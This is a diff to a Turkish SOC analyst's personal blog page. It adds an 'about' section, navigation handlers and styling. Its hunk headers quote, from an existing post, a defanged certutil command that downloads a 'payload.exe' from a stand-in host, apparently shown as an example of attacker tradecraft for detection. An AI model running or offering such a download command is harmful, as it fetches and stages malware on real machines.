@@ -41,6 +41,20 @@
     letter-spacing:.5px;
     margin-bottom:10px;
   }
+  .about-body{
+    display:none;
+    padding:28px 0 60px;
+  }
+  .about-body.open{display:block;}
+  .about-body h2{
+    font-size:19px;
+    margin:22px 0 8px;
+    color:var(--accent);
+  }
+  .about-body h2:first-child{margin-top:0;}
+  .about-body p{color:var(--text); margin-bottom:6px;}
+  .about-body ul{list-style:none; margin-top:6px;}
+  .about-body li{color:var(--text-dim); font-size:14.5px; margin-bottom:4px;}
   header h1{
     font-size:28px;
     font-weight:600;
@@ -141,11 +155,11 @@
 <div class="wrap">
   <header>
     <div class="tag">$ whoami</div>
-    <h1>roman<span>//</span>günlük</h1>
-    <p>SOC analyst notları, güvenlik operasyonları ve öğrenme sürecinden kısa yazılar.</p>
+    <h1 id="site-title">roman<span>//</span>günlük</h1>
+    <p id="site-desc">Siber güvenlik alanındaki öğrendiklerimi ve ilgimi çeken konuları paylaştığım kişisel bir platform.</p>
     <nav>
-      <a href="#" class="active" onclick="showList(); return false;">yazılar</a>
-      <a href="#" onclick="return false;">hakkımda</a>
+      <a href="#" class="active" onclick="showList(); return false;" id="nav-posts">yazılar</a>
+      <a href="#" onclick="showAbout(); return false;" id="nav-about">hakkımda</a>
     </nav>
   </header>
 
@@ -158,6 +172,21 @@
 
     <!-- TEK YAZI GÖRÜNÜMÜ -->
     <div id="post-detail" class="post-body"></div>
+
+    <!-- HAKKIMDA -->
+    <div id="about" class="about-body">
+      <h2>Blog İçeriği</h2>
+      <p>Genel siber güvenlik konuları üzerine yazılar paylaşıyorum. Ağırlıklı olarak SOC (Security Operations Center) tarafında çalıştığım için tehdit tespiti ve olay müdahalesi ile ilgili gözlemlerim de sık sık burada yer alacak.</p>
+
+      <h2>Hakkımda</h2>
+      <p>Merhaba! Bilgisayar mühendisliği mezunuyum ve SOC Analisti olarak çalışıyorum. Öğrendiklerimi burada paylaşıyorum.</p>
+
+      <h2>İletişim</h2>
+      <ul>
+        <li>Mail: (buraya ekle)</li>
+        <li>LinkedIn: (buraya ekle)</li>
+      </ul>
+    </div>
   </main>
 
   <footer>
@@ -201,6 +230,9 @@ Command: certutil -urlcache -split -f http://example[.]com/payload.exe</code></p
 
   const listEl = document.getElementById('post-list');
   const detailEl = document.getElementById('post-detail');
+  const aboutEl = document.getElementById('about');
+  const navPosts = document.getElementById('nav-posts');
+  const navAbout = document.getElementById('nav-about');
 
   function renderList(){
     listEl.innerHTML = posts.map(p => `
@@ -217,6 +249,7 @@ Command: certutil -urlcache -split -f http://example[.]com/payload.exe</code></p
     const p = posts.find(x => x.id === id);
     if(!p) return showList();
     listEl.style.display = 'none';
+    aboutEl.classList.remove('open');
     detailEl.classList.add('open');
     detailEl.innerHTML = `
       <a class="back-link" href="#" onclick="showList(); return false;">← tüm yazılar</a>
@@ -226,20 +259,38 @@ Command: certutil -urlcache -split -f http://example[.]com/payload.exe</code></p
     `;
     window.scrollTo(0,0);
     history.replaceState(null, '', '#' + id);
+    navPosts.classList.add('active');
+    navAbout.classList.remove('active');
   }
 
   function showList(){
     detailEl.classList.remove('open');
     detailEl.innerHTML = '';
+    aboutEl.classList.remove('open');
     listEl.style.display = 'block';
     history.replaceState(null, '', '#');
+    navPosts.classList.add('active');
+    navAbout.classList.remove('active');
+  }
+
+  function showAbout(){
+    listEl.style.display = 'none';
+    detailEl.classList.remove('open');
+    detailEl.innerHTML = '';
+    aboutEl.classList.add('open');
+    window.scrollTo(0,0);
+    history.replaceState(null, '', '#hakkimda');
+    navAbout.classList.add('active');
+    navPosts.classList.remove('active');
   }
 
   renderList();
 
-  // Sayfa doğrudan bir #yazi-id ile açılırsa o yazıyı göster
+  // Sayfa doğrudan bir #yazi-id veya #hakkimda ile açılırsa ona göre göster
   const initial = location.hash.replace('#','');
-  if(initial){
+  if(initial === 'hakkimda'){
+    showAbout();
+  } else if(initial){
     const found = posts.find(p => p.id === initial);
     if(found) showPost(initial);
   }
